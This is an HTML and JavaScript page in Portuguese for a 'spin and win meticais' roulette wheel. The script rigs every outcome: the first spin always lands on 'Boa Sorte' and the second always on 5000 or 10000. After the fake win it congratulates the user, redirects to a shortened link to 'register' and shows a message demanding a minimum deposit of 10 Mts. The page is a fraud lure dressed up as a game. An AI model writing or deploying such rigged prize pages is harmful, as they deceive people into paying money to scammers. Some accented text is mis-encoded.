<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Roleta de Meticais</title>
  <style>
    body {
      background: #fff;
      text-align: center;
      font-family: sans-serif;
    }
    #wheel-container {
      position: relative;
      width: 500px;
      height: 500px;
      margin: 40px auto;
    }
    #wheel {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 15px solid gold;
      position: relative;
      transition: transform 5s cubic-bezier(0.33, 1, 0.68, 1);
    }
    .slice {
      position: absolute;
      width: 50%;
      height: 50%;
      background: red;
      transform-origin: 100% 100%;
      clip-path: polygon(100% 100%, 0% 100%, 100% 0%);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: bold;
      font-size: 16px;
    }
    #arrow {
      width: 0;
      height: 0;
      border-top: 25px solid transparent;
      border-bottom: 25px solid transparent;
      border-left: 50px solid black;
      position: absolute;
      left: -50px;
      top: 50%;
      transform: translateY(-50%);
    }
    button {
      margin-top: 20px;
      padding: 12px 25px;
      font-size: 18px;
      border-radius: 8px;
      border: none;
      background: gold;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <h1>Gira e Ganha Meticais!</h1>
  <div id="wheel-container">
    <div id="arrow"></div>
    <div id="wheel"></div>
  </div>
  <button id="spin">GIRAR</button>

  <script>
    const slices = [
      { label: 'Boa Sorte', color: 'red' },
      { label: '10', color: 'green' },
      { label: '100', color: 'blue' },
      { label: '500', color: 'yellow' },
      { label: '1000', color: 'green' },
      { label: '5000', color: 'yellow' },
      { label: '10000', color: 'red' },
      { label: '10', color: 'green' }
    ];

    const wheel = document.getElementById('wheel');
    const spinBtn = document.getElementById('spin');
    let spinning = false;
    let spinCount = 0;

    function buildWheel() {
      const angle = 360 / slices.length;
      slices.forEach((slice, index) => {
        const div = document.createElement('div');
        div.className = 'slice';
        div.style.background = slice.color;
        div.style.transform = `rotate(${index * angle}deg) skewY(-${90 - angle}deg)`;
        div.innerHTML = `<div style="transform: skewY(${90 - angle}deg) rotate(${angle / 2}deg)">${slice.label}</div>`;
        wheel.appendChild(div);
      });
    }

    function getRotationForLabel(label) {
      const index = slices.findIndex(s => s.label === label);
      const anglePerSlice = 360 / slices.length;
      const stopAngle = 360 - (index * anglePerSlice + anglePerSlice / 2);
      return stopAngle + 360 * 5;
    }

    function playSound() {
      const audio = new Audio('https://actions.google.com/sounds/v1/cartoon/clang_and_wobble.ogg');
      audio.play();
    }

    spinBtn.addEventListener('click', () => {
      if (spinning) return;

      spinning = true;
      spinCount++;

      let stopLabel = 'Boa Sorte';
      if (spinCount === 2) {
        stopLabel = Math.random() < 0.5 ? '5000' : '10000';
      }

      const rotation = getRotationForLabel(stopLabel);
      wheel.style.transition = 'transform 5s cubic-bezier(0.33, 1, 0.68, 1)';
      wheel.style.transform = `rotate(${rotation}deg)`;

      setTimeout(() => {
        playSound();

        if (spinCount === 1) {
          alert(`Resultado: ${stopLabel}`);
          spinBtn.textContent = 'GIRAR NOVAMENTE';
        } else {
          const modal = confirm(`üéâ Parab√©ns! Voc√™ ganhou ${stopLabel} Meticais!\nClique OK para se registar.`);
          if (modal) {
            window.location.href = "https://is.gd/hHdRiZ";
            alert("Caro usu√°rio, primeiro fa√ßa um dep√≥sito m√≠nimo de 10 Mts e aguarde pacientemente.");
          }
        }

        spinning = false;
      }, 5100);
    });

    buildWheel();
  </script>
</body>
</html>
